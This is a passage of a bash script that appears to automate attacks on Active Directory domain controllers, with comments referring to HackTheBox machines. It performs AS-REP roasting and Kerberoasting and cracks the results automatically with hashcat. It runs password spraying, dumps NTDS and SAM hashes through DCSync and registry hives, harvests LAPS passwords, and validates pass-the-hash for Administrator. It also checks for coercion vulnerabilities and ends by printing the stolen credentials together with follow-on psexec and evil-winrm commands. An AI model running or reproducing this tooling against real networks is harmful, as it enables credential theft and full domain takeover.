            -format hashcat -outputfile "$OUTDIR/hashes/asrep_auto.txt" 2>&1 | tee -a "$OUTDIR/hashes/asrep_stdout.txt"
    elif [[ -n "$DUMP_USER" && -n "$DUMP_HASH" ]]; then
        info "AS-REP Roasting with hash auth ($DUMP_USER)..."
        impacket-GetNPUsers "$DOMAIN/$DUMP_USER" -dc-ip "$TARGET" -hashes "$DUMP_HASH" -request \
            -format hashcat -outputfile "$OUTDIR/hashes/asrep_auto.txt" 2>&1 | tee -a "$OUTDIR/hashes/asrep_stdout.txt"
    fi

    # Also try common usernames if no users discovered
    if [[ ! -s "$ATTACK_USERS" ]]; then
        info "No users discovered, trying common AD usernames..."
        COMMON_USERS=$(mktemp)
        printf '%s\n' administrator admin guest krbtgt svc_admin svc-admin svc_sql sql_svc \
            backup service web_svc ftp_user iis_user test support helpdesk > "$COMMON_USERS"
        impacket-GetNPUsers "$DOMAIN/" -dc-ip "$TARGET" -no-pass \
            -usersfile "$COMMON_USERS" -format hashcat -outputfile "$OUTDIR/hashes/asrep_common.txt" 2>&1 | tee -a "$OUTDIR/hashes/asrep_stdout.txt"
        # Extract valid usernames from "User ... doesn't have UF_DONT_REQUIRE_PREAUTH" messages
        grep -oP 'User\s+\K\S+(?=\s+doesn)' "$OUTDIR/hashes/asrep_stdout.txt" 2>/dev/null | while read -r u; do
            add_user "$u"
        done
        rm -f "$COMMON_USERS"
    fi

    ASREP=$(cat "$OUTDIR/hashes/asrep.txt" "$OUTDIR/hashes/asrep_auto.txt" "$OUTDIR/hashes/asrep_common.txt" 2>/dev/null | grep '\$krb5asrep\$' | sort -u)
    if [[ -n "$ASREP" ]]; then
        crit "★ AS-REP HASHES: $(echo "$ASREP" | wc -l)"
        echo "$ASREP" | while read -r h; do
            U=$(echo "$h" | grep -oP '\$krb5asrep\$23\$\K[^@:]+'); save_hash "ASREP|$U|$h"
            echo -e "  ${YEL}$U${RST}"
        done
        # Auto-crack
        if command -v hashcat &>/dev/null && [[ -f "$PASSLIST" ]]; then
            info "Auto-cracking AS-REP..."
            echo "$ASREP" > "$OUTDIR/hashes/asrep_all.txt"
            timeout 180 hashcat -m 18200 -a 0 "$OUTDIR/hashes/asrep_all.txt" "$PASSLIST" --force --quiet 2>/dev/null
            hashcat -m 18200 "$OUTDIR/hashes/asrep_all.txt" --show 2>/dev/null | while IFS=: read -r hash pass; do
                U=$(echo "$hash" | grep -oP '\$krb5asrep\$23\$\K[^@:]+')
                [[ -n "$U" && -n "$pass" ]] && save_cred "$U" "$pass"
            done
        fi
    fi
fi

# ── 6b: Kerberoasting (HTB: Active, Administrator) ──
sep; info "★ Kerberoasting..."
if [[ -n "$DOMAIN" ]]; then
    # Anonymous Kerberoast attempt (rarely works but worth trying)
    impacket-GetUserSPNs "$DOMAIN/" -dc-ip "$TARGET" -no-pass -request \
        -outputfile "$OUTDIR/hashes/kerb_noauth.txt" 2>&1 | tee "$OUTDIR/hashes/kerb_stdout.txt"

    get_best_cred
    # Authenticated Kerberoast
    if [[ -n "$DUMP_USER" && -n "$DUMP_PASS" ]]; then
        info "Auth Kerberoast as $DUMP_USER..."
        impacket-GetUserSPNs "$DOMAIN/$DUMP_USER:$DUMP_PASS" -dc-ip "$TARGET" -request \
            -outputfile "$OUTDIR/hashes/kerb_auth.txt" 2>&1 | tee -a "$OUTDIR/hashes/kerb_stdout.txt"
    elif [[ -n "$DUMP_USER" && -n "$DUMP_HASH" ]]; then
        info "Hash Kerberoast as $DUMP_USER..."
        impacket-GetUserSPNs "$DOMAIN/$DUMP_USER" -dc-ip "$TARGET" -hashes "$DUMP_HASH" -request \
            -outputfile "$OUTDIR/hashes/kerb_auth.txt" 2>&1 | tee -a "$OUTDIR/hashes/kerb_stdout.txt"
    fi

    KERB=$(cat "$OUTDIR/hashes/kerb_noauth.txt" "$OUTDIR/hashes/kerb_auth.txt" 2>/dev/null | grep '\$krb5tgs\$' | sort -u)
    if [[ -n "$KERB" ]]; then
        crit "★ KERBEROAST HASHES: $(echo "$KERB" | wc -l)"
        echo "$KERB" | while read -r h; do
            U=$(echo "$h" | grep -oP '\$krb5tgs\$\d+\$\*\K[^*]+'); save_hash "TGS|$U|$h"
            echo -e "  ${YEL}$U${RST}"
        done
        # Auto-crack
        if command -v hashcat &>/dev/null && [[ -f "$PASSLIST" ]]; then
            info "Auto-cracking Kerberoast..."
            echo "$KERB" > "$OUTDIR/hashes/kerb_all.txt"
            timeout 180 hashcat -m 13100 -a 0 "$OUTDIR/hashes/kerb_all.txt" "$PASSLIST" --force --quiet 2>/dev/null
            hashcat -m 13100 "$OUTDIR/hashes/kerb_all.txt" --show 2>/dev/null | while IFS=: read -r hash pass; do
                U=$(echo "$hash" | grep -oP '\$krb5tgs\$\d+\$\*\K[^*]+')
                [[ -n "$U" && -n "$pass" ]] && save_cred "$U" "$pass"
            done
        fi
    fi
fi

# ── 6c: Password Spraying (Advanced) ──
sep; info "★ Password Spraying..."
if [[ -s "$ATTACK_USERS" ]] && command -v netexec &>/dev/null && [[ -n "$DOMAIN" ]]; then
    # First: Check password policy
    info "Checking password policy before spray..."
    netexec smb "$TARGET" -u '' -p '' --pass-pol 2>/dev/null | tee "$OUTDIR/passwords/policy.txt"
    
    # 1. Username-as-password spray
    info "Username-as-password spray..."
    netexec smb "$TARGET" -u "$ATTACK_USERS" -p "$ATTACK_USERS" --continue-on-success --no-bruteforce 2>/dev/null | tee -a "$OUTDIR/passwords/spray.txt"
    parse_nxc_output "$OUTDIR/passwords/spray.txt" ""

    # 2. Common AD mutations
    info "Password mutations spray..."
    MUTATIONS_FILE=$(mktemp)
    YEAR=$(date +%Y)
    printf '%s\n' "Password123" "P@ssword123" "Welcome123!" "Spring$YEAR" "Summer$YEAR" "Fall$YEAR" "Winter$YEAR" "August$YEAR" "${DOMAIN%%.*}123" > "$MUTATIONS_FILE"
    netexec smb "$TARGET" -u "$ATTACK_USERS" -p "$MUTATIONS_FILE" --continue-on-success 2>/dev/null | tee -a "$OUTDIR/passwords/spray_mutations.txt"
    parse_nxc_output "$OUTDIR/passwords/spray_mutations.txt" ""
    rm -f "$MUTATIONS_FILE"

    # 3. Default list spray
    SPRAY_N=0
    while IFS= read -r pass && [[ $SPRAY_N -lt 5 ]]; do
        info "Spray: $pass"
        OUT_F="$OUTDIR/passwords/spray_$SPRAY_N.txt"
        netexec smb "$TARGET" -u "$ATTACK_USERS" -p "$pass" --continue-on-success 2>/dev/null | tee "$OUT_F"
        parse_nxc_output "$OUT_F" "$pass"
        SPRAY_N=$((SPRAY_N+1)); sleep 2
    done < "$PASSLIST"
fi

# ── Re-run Authenticated Enumeration if credentials found ──
get_best_cred
if [[ -n "$DUMP_USER" && -n "$DUMP_PASS" ]]; then
    phase "6 EXTRA — AUTHENTICATED RE-ENUMERATION"
    info "New credentials found! Re-running sensitive enumeration as $DUMP_USER..."
    
    # Re-run LDAP with auth
    LU="ldap://$TARGET"
    info "Re-running LDAP dump with auth..."
    ldapdomaindump "$LU" -u "$DOMAIN\\$DUMP_USER" -p "$DUMP_PASS" -o "$OUTDIR/ldap/dump_auth" 2>/dev/null
    
    # Check LAPS again with auth
    info "Checking LAPS with auth..."
    ldapsearch -x -H "$LU" -D "$DUMP_USER@$DOMAIN" -w "$DUMP_PASS" -b "$DOMAIN_DN" "(objectClass=computer)" ms-Mcs-AdmPwd ms-LAPS-Password cn 2>/dev/null >> "$OUTDIR/ldap/laps_auth.txt"
    grep -E "(ms-Mcs-AdmPwd|ms-LAPS-Password):" "$OUTDIR/ldap/laps_auth.txt" 2>/dev/null | while read -r line; do
        crit "★ LAPS PASSWORD FOUND: $line"
        save_hash "LAPS|$line"
    done

    # Re-run SMB share enum with auth
    info "Re-running SMB share enum with auth..."
    netexec smb "$TARGET" -u "$DUMP_USER" -p "$DUMP_PASS" --shares 2>/dev/null | tee "$OUTDIR/smb/shares_auth.txt"
    
    # Re-run GPP with auth
    info "Re-checking GPP with auth..."
    for share in Replication SYSVOL NETLOGON; do
        smbclient "//$TARGET/$share" -U "$DUMP_USER%$DUMP_PASS" -c "recurse ON; prompt OFF; lcd $OUTDIR/smb/gpp_files; mget *.xml" 2>/dev/null
    done
fi

# ═══════════════════════════════════════════════════════════════════════════════
#  PHASE 7 — DCSync + NTDS DUMP + Pass-the-Hash
# ═══════════════════════════════════════════════════════════════════════════════
phase "7 — DCSync & HASH DUMP"
get_best_cred

if [[ -n "$DUMP_USER" && ( -n "$DUMP_PASS" || -n "$DUMP_HASH" ) && -n "$DOMAIN" ]]; then
    # Build auth string
    if [[ -n "$DUMP_HASH" ]]; then
        AUTH_STR="$DOMAIN/$DUMP_USER@$TARGET"
        HASH_ARG="-hashes $DUMP_HASH"
        crit "Using Pass-the-Hash: $DUMP_USER"
    else
        AUTH_STR="$DOMAIN/$DUMP_USER:$DUMP_PASS@$TARGET"
        HASH_ARG=""
        crit "Using creds: $DUMP_USER"
    fi

    # ★ secretsdump — DCSync (HTB: Forest, Administrator)
    info "★ impacket-secretsdump (DCSync)..."
    impacket-secretsdump $AUTH_STR $HASH_ARG -outputfile "$OUTDIR/hashes/secretsdump" 2>/dev/null | tee "$OUTDIR/hashes/secretsdump_stdout.txt"

    # ★ impacket-reg (Remote Registry)
    info "★ impacket-reg (Hives dump)..."
    impacket-reg $AUTH_STR $HASH_ARG save -keyName 'HKLM\SAM' -o "$OUTDIR/hashes/sam.hive" 2>/dev/null
    impacket-reg $AUTH_STR $HASH_ARG save -keyName 'HKLM\SECURITY' -o "$OUTDIR/hashes/security.hive" 2>/dev/null
    impacket-reg $AUTH_STR $HASH_ARG save -keyName 'HKLM\SYSTEM' -o "$OUTDIR/hashes/system.hive" 2>/dev/null

    if [[ -f "$OUTDIR/hashes/secretsdump.ntds" ]]; then
        NTDS_C=$(wc -l < "$OUTDIR/hashes/secretsdump.ntds")
        crit "★★★ NTDS HASHES: $NTDS_C accounts ★★★"
        while IFS=: read -r acct rid lm ntlm rest; do
            [[ -z "$acct" ]] && continue
            save_hash "NTDS|$acct|$ntlm"
            echo -e "  ${RED}$acct : $ntlm${RST}"
        done < "$OUTDIR/hashes/secretsdump.ntds"
    fi
    [[ -f "$OUTDIR/hashes/secretsdump.sam" ]] && {
        crit "★ SAM hashes extracted"
        while IFS=: read -r a r l n rest; do save_hash "SAM|$a|$n"; done < "$OUTDIR/hashes/secretsdump.sam"
    }

    # VSS backup method
    info "★ NTDS via VSS..."
    impacket-secretsdump $AUTH_STR $HASH_ARG -use-vss -outputfile "$OUTDIR/hashes/secretsdump_vss" 2>/dev/null

    # netexec dumps
    if command -v netexec &>/dev/null; then
        NXC_AUTH="-u '$DUMP_USER'"
        [[ -n "$DUMP_HASH" ]] && NXC_AUTH="$NXC_AUTH -H '$DUMP_HASH'" || NXC_AUTH="$NXC_AUTH -p '$DUMP_PASS'"
        for dump_type in --sam --lsa --ntds --dpapi; do
            eval netexec smb "$TARGET" $NXC_AUTH $dump_type 2>/dev/null | tee "$OUTDIR/hashes/nxc${dump_type//-/_}.txt"
        done
    fi

    # ★ Pass-the-Hash validation for admin
    info "★ Testing Pass-the-Hash for Administrator..."
    ADMIN_HASH=$(grep -i "^Administrator:" "$OUTDIR/hashes/secretsdump.ntds" 2>/dev/null | head -1 | cut -d: -f4)
    if [[ -n "$ADMIN_HASH" ]] && command -v netexec &>/dev/null; then
        PTH_RESULT=$(netexec smb "$TARGET" -u 'Administrator' -H "$ADMIN_HASH" 2>/dev/null)
        echo "$PTH_RESULT" | tee "$OUTDIR/hashes/pth_admin.txt"
        echo "$PTH_RESULT" | grep -qi "Pwn3d" && {
            crit "★★★ ADMIN PASS-THE-HASH WORKS ★★★"
            crit "  netexec smb $TARGET -u Administrator -H $ADMIN_HASH"
            crit "  impacket-psexec $DOMAIN/Administrator@$TARGET -hashes aad3b435b51404eeaad3b435b51404ee:$ADMIN_HASH"
            save_cred "Administrator" "PTH:$ADMIN_HASH"
        }
        # WinRM PtH
        echo "$OPEN_PORTS" | grep -qE "(5985|5986)" && {
            netexec winrm "$TARGET" -u 'Administrator' -H "$ADMIN_HASH" 2>/dev/null | tee "$OUTDIR/hashes/pth_winrm.txt"
            grep -qi "Pwn3d" "$OUTDIR/hashes/pth_winrm.txt" 2>/dev/null && {
                crit "★★★ WinRM PtH WORKS ★★★"
                crit "  evil-winrm -i $TARGET -u Administrator -H $ADMIN_HASH"
            }
        }
    fi

    # ★ BloodHound collection
    command -v bloodhound-python &>/dev/null && {
        info "BloodHound data collection..."
        if [[ -n "$DUMP_PASS" ]]; then
            bloodhound-python -u "$DUMP_USER" -p "$DUMP_PASS" -ns "$TARGET" -d "$DOMAIN" -c All --zip -o "$OUTDIR/bloodhound/" 2>/dev/null
        fi
        ok "BloodHound → $OUTDIR/bloodhound/"
    }
else
    warn "No credentials for DCSync."
    impacket-secretsdump "${DOMAIN:-X}/"'@'"$TARGET" -no-pass 2>/dev/null | tee "$OUTDIR/hashes/secretsdump_noauth.txt"
fi

# ═══════════════════════════════════════════════════════════════════════════════
#  PHASE 8 — ADCS + CERTIFICATES (HTB: Sizzle-style)
# ═══════════════════════════════════════════════════════════════════════════════
phase "8 — ADCS & CERTIFICATES"
get_best_cred

if command -v certipy-ad &>/dev/null && [[ -n "$DUMP_USER" && -n "$DOMAIN" ]]; then
    info "★ Certipy — AD Certificate Services enumeration..."
    if [[ -n "$DUMP_PASS" ]]; then
        certipy-ad find -u "$DUMP_USER@$DOMAIN" -p "$DUMP_PASS" -dc-ip "$TARGET" \
            -vulnerable -stdout 2>/dev/null | tee "$OUTDIR/certs/certipy_vuln.txt"
    fi
    VULN_TEMPLATES=$(grep -c "ESC" "$OUTDIR/certs/certipy_vuln.txt" 2>/dev/null || echo 0)
    [[ $VULN_TEMPLATES -gt 0 ]] && crit "★ VULNERABLE CERT TEMPLATES FOUND: $VULN_TEMPLATES (check certipy output)"
else
    [[ -n "$DUMP_USER" ]] && warn "certipy-ad not installed. Install: pip install certipy-ad"
fi

# ═══════════════════════════════════════════════════════════════════════════════
#  PHASE 9 — WEB + WINRM + ADDITIONAL
# ═══════════════════════════════════════════════════════════════════════════════
phase "9 — ADDITIONAL ENUMERATION"

# Web
echo "$OPEN_PORTS" | grep -qE "(80|443|8080)" && command -v gobuster &>/dev/null && {
    info "Gobuster..."
    for p in 80 443 8080; do
        echo "$OPEN_PORTS" | grep -q "$p" && {
            PR="http"; [[ "$p" == "443" ]] && PR="https"
            gobuster dir -u "$PR://$TARGET:$p/" -w /usr/share/wordlists/dirb/common.txt -t 30 -q -o "$OUTDIR/web/gobuster_$p.txt" --no-error 2>/dev/null &
        }
    done; wait
}

# FTP anonymous
echo "$OPEN_PORTS" | grep -q "21" && {
    info "FTP anonymous check..."
    echo -e "anonymous\nanonymous\nls\nquit" | ftp -n "$TARGET" 2>/dev/null | tee "$OUTDIR/misc/ftp_anon.txt"
}

# ═══════════════════════════════════════════════════════════════════════════════
#  PHASE 10 — COERCION & RELAY DETECTION
# ═══════════════════════════════════════════════════════════════════════════════
phase "10 — COERCION & RELAY DETECTION"

# PetitPotam check
info "PetitPotam (EfsRpcOpenFileRaw) check..."
impacket-rpcdump -target "$TARGET" 2>/dev/null | grep -q "c681d488-d850-11d0-8c52-00c04fd90f7e" && {
    crit "★ PetitPotam Vulnerable? MS-EFSR interface found!"
}

# PrinterBug (SpoolSample) check
info "PrinterBug (MS-RPRN) check..."
impacket-rpcdump -target "$TARGET" 2>/dev/null | grep -q "12345678-1234-abcd-ef00-0123456789ab" && {
    crit "★ PrinterBug potential: Print Spooler interface found!"
}

# WebDAV check
info "WebDAV (WebClient) check..."
netexec smb "$TARGET" -M webdav 2>/dev/null | grep -q "(+) Found" && {
    crit "★ WebDAV (WebClient) running — relay via HTTP possible!"
}

# Responder suggestion
info "Relay Attack Simulation:"
echo -e "  ${YEL}responder -I eth0 -d -w -v${RST}"
echo -e "  ${YEL}ntlmrelayx.py -t smb://$TARGET -smb2support${RST}"

# ═══════════════════════════════════════════════════════════════════════════════
#  ★★★ FINAL RESULTS — ALL PASSWORDS & HASHES ★★★
# ═══════════════════════════════════════════════════════════════════════════════
echo ""
echo -e "${RED}${BOLD}"
echo "╔═══════════════════════════════════════════════════════════════════════╗"
echo "║                    ★ ★ ★   SCAN COMPLETE   ★ ★ ★                    ║"
echo "╚═══════════════════════════════════════════════════════════════════════╝"
echo -e "${RST}"

# Target Info
echo -e "${WHT}${BOLD}┌─── TARGET ─────────────────────────────────────────────────────────┐${RST}"
printf "${WHT}│${RST} IP         : ${CYN}%-54s${RST}${WHT}│${RST}\n" "$TARGET"
printf "${WHT}│${RST} Domain     : ${CYN}%-54s${RST}${WHT}│${RST}\n" "$DOMAIN"
printf "${WHT}│${RST} DC         : ${CYN}%-54s${RST}${WHT}│${RST}\n" "$DC_HOST"
printf "${WHT}│${RST} Ports      : ${CYN}%-54s${RST}${WHT}│${RST}\n" "$OPEN_PORTS"
UC=$(wc -l < "$USERS_FILE" 2>/dev/null || echo 0)
VC=$(wc -l < "$VALID_USERS" 2>/dev/null || echo 0)
printf "${WHT}│${RST} Users      : ${GRN}%-54s${RST}${WHT}│${RST}\n" "$UC discovered, $VC validated"
echo -e "${WHT}└────────────────────────────────────────────────────────────────────┘${RST}"

# ══ CREDENTIALS ══
CC=$(wc -l < "$CREDS_FILE" 2>/dev/null || echo 0)
echo ""
echo -e "${RED}${BOLD}┌─── ★ PASSWORDS / CREDENTIALS FOUND ($CC) ─────────────────────────┐${RST}"
if [[ -s "$CREDS_FILE" ]]; then
    while IFS=: read -r user pass; do
        printf "${RED}${BOLD}│${RST}  ${GRN}★${RST} ${BOLD}${WHT}%-25s${RST}  →  ${RED}${BOLD}%-32s${RST} ${RED}${BOLD}│${RST}\n" "$user" "$pass"
    done < "$CREDS_FILE"
else
    printf "${RED}│${RST}  ${DIM}%-65s${RST} ${RED}│${RST}\n" "No plaintext credentials discovered"
fi
echo -e "${RED}${BOLD}└────────────────────────────────────────────────────────────────────┘${RST}"

# ══ HASHES ══
echo ""
echo -e "${YEL}${BOLD}┌─── ★ NTLM HASHES EXTRACTED ──────────────────────────────────────┐${RST}"
if [[ -f "$OUTDIR/hashes/secretsdump.ntds" ]]; then
    NC=$(wc -l < "$OUTDIR/hashes/secretsdump.ntds")
    printf "  ${YEL}│${RST}  ${RED}★ NTDS.dit — %-2s domain accounts:                               ${YEL}│${RST}\n" "$NC"
    head -15 "$OUTDIR/hashes/secretsdump.ntds" | while IFS=: read -r acct rid lm ntlm rest; do
        printf "  ${YEL}│${RST}    ${WHT}%-25s${RST} ${CYN}%-32s${RST} ${YEL}│${RST}\n" "$acct" "$ntlm"
    done
    [[ $NC -gt 15 ]] && printf "  ${YEL}│${RST}    ${DIM}... +%-2s more                                            ${YEL}│${RST}\n" "$((NC-15))"
fi
[[ -f "$OUTDIR/hashes/secretsdump.sam" ]] && {
    SC=$(wc -l < "$OUTDIR/hashes/secretsdump.sam")
    printf "  ${YEL}│${RST}  ${RED}★ SAM — %-2s local accounts                                     ${YEL}│${RST}\n" "$SC"
    cat "$OUTDIR/hashes/secretsdump.sam" | while IFS=: read -r a r l n rest; do
        printf "  ${YEL}│${RST}    ${WHT}%-25s${RST} ${CYN}%-32s${RST} ${YEL}│${RST}\n" "$a" "$n"
    done
}
# Kerberos hashes
grep -q "\$krb5asrep\$" "$OUTDIR/hashes/"*.txt 2>/dev/null && AC=$(grep -c "\$krb5asrep\$" "$OUTDIR/hashes/"*.txt 2>/dev/null | awk -F: '{sum+=$2} END {print sum}')
AC=${AC:-0}; AC=$(echo "$AC" | tr -d '[:space:]')
grep -q "\$krb5tgs\$" "$OUTDIR/hashes/"*.txt 2>/dev/null && KC=$(grep -c "\$krb5tgs\$" "$OUTDIR/hashes/"*.txt 2>/dev/null | awk -F: '{sum+=$2} END {print sum}')
KC=${KC:-0}; KC=$(echo "$KC" | tr -d '[:space:]')
[[ "$AC" -gt 0 ]] 2>/dev/null && printf "  ${YEL}│${RST}  ${MAG}★ AS-REP: %-2s hashes discovered                              ${YEL}│${RST}\n" "$AC"
[[ "$KC" -gt 0 ]] 2>/dev/null && printf "  ${YEL}│${RST}  ${MAG}★ Kerberoast: %-2s hashes discovered                          ${YEL}│${RST}\n" "$KC"

# Custom hashes from LDAP (LAPS, B64, etc.) - Filter out SAM/NTDS
HC=$(grep -vE "^(NTDS|SAM)\|" "$HASHES_FILE" 2>/dev/null | wc -l || echo 0); HC=$(echo "$HC" | tr -d '[:space:]')
if [[ "$HC" -gt 0 ]] 2>/dev/null; then
    printf "  ${YEL}│${RST}  ${MAG}★ Other hashes: %-2s entries                                    ${YEL}│${RST}\n" "$HC"
    grep -vE "^(NTDS|SAM)\|" "$HASHES_FILE" 2>/dev/null | while read -r h; do
        # Truncate if too long
        h_disp=$(echo "$h" | cut -c1-58)
        [[ ${#h} -gt 58 ]] && h_disp="${h_disp}..."
        printf "  ${YEL}│${RST}    ${WHT}%-60s${RST} ${YEL}│${RST}\n" "$h_disp"
    done
fi

[[ ! -f "$OUTDIR/hashes/secretsdump.ntds" && ! -f "$OUTDIR/hashes/secretsdump.sam" && "${AC:-0}" -eq 0 && "${KC:-0}" -eq 0 && "${HC:-0}" -eq 0 ]] 2>/dev/null && \
    echo -e "  ${YEL}│${RST}  ${DIM}No hashes extracted (try with credentials: -u user -p pass)      ${YEL}│${RST}"
echo -e "${YEL}${BOLD}└────────────────────────────────────────────────────────────────────┘${RST}"

# ══ NEXT STEPS ══
echo ""
echo -e "${CYN}${BOLD}┌─── ATTACK COMMANDS ───────────────────────────────────────────────┐${RST}"
echo -e "${CYN}│${RST} Crack NTLM    : ${WHT}hashcat -m 1000 secretsdump.ntds rockyou.txt${RST}"
echo -e "${CYN}│${RST} Crack AS-REP  : ${WHT}hashcat -m 18200 asrep.txt rockyou.txt${RST}"
echo -e "${CYN}│${RST} Crack TGS     : ${WHT}hashcat -m 13100 kerb.txt rockyou.txt${RST}"
echo -e "${CYN}│${RST} Pass-the-Hash : ${WHT}netexec smb $TARGET -u Administrator -H <HASH>${RST}"
echo -e "${CYN}│${RST} Evil-WinRM    : ${WHT}evil-winrm -i $TARGET -u <user> -H <HASH>${RST}"
echo -e "${CYN}│${RST} PSExec        : ${WHT}impacket-psexec $DOMAIN/admin@$TARGET -hashes <LM:NT>${RST}"
echo -e "${CYN}│${RST} WMIExec       : ${WHT}impacket-wmiexec $DOMAIN/admin@$TARGET -hashes <LM:NT>${RST}"
echo -e "${CYN}${BOLD}└────────────────────────────────────────────────────────────────────┘${RST}"
echo ""
echo -e "${GRN}${BOLD}All results → $OUTDIR/${RST}"
echo ""

# Write report
{
    echo ""; echo "=== CREDENTIALS ==="; cat "$CREDS_FILE" 2>/dev/null
    echo ""; echo "=== NTDS HASHES ==="; cat "$OUTDIR/hashes/secretsdump.ntds" 2>/dev/null
    echo ""; echo "=== SAM HASHES ==="; cat "$OUTDIR/hashes/secretsdump.sam" 2>/dev/null
} >> "$OUTDIR/report.txt"
